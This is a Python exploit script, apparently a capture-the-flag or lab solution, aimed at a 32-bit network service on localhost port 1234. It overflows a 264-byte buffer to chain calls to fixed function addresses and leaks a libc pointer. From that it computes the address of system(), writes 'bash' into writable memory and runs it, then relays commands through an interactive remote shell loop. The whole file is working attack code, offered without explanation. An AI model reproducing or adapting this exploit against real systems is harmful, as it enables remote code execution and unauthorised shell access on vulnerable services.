import sys
import socket
import struct


HOST = 'localhost'
PORT = 1234

def make_overflow(func, next_func, *args):
    call_code = b'0' * 264 # for padding
    call_code += struct.pack('I', 0x0)
    call_code += struct.pack('I', func)
    call_code += struct.pack('I', next_func)

    for arg in args:
        call_code += struct.pack('I', arg)

    call_code += struct.pack('B', 0xa)
    return call_code


def do_overflow(sock, func, next_func, *args):
    recv = sock.recv(512)
    overflow = make_overflow(func, next_func, *args)
    sock.send(overflow)
    recv = sock.recv(512)
    return recv


def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))

        handle_addr = 0x08048af4
        send_offset = 0x000e81e0
        system_offset = 0x0003ada0
        sendlen_addr = 0x08048a61
        recvline_addr = 0x080489e6
        send_addr_location = 0x804a270
        writable_location = 0x0804a10c

        res = do_overflow(s, sendlen_addr, handle_addr, send_addr_location, 0x4)
        res = s.recv(4)
        getpwnam_addr = struct.unpack("I", res)[0]
        system_addr = getpwnam_addr - send_offset + system_offset

        data = b'bash\n'
        do_overflow(s, recvline_addr, handle_addr, writable_location)
        s.send(data)
        do_overflow(s, system_addr, handle_addr, writable_location)
        while True:
            print('input command: ', end='', flush=True)
            cmd = sys.stdin.readline()
            s.send(cmd.encode())
            res = s.recv(512)
            if cmd == 'exit\n':
                break
            print(res)


if __name__ == '__main__':
    main()
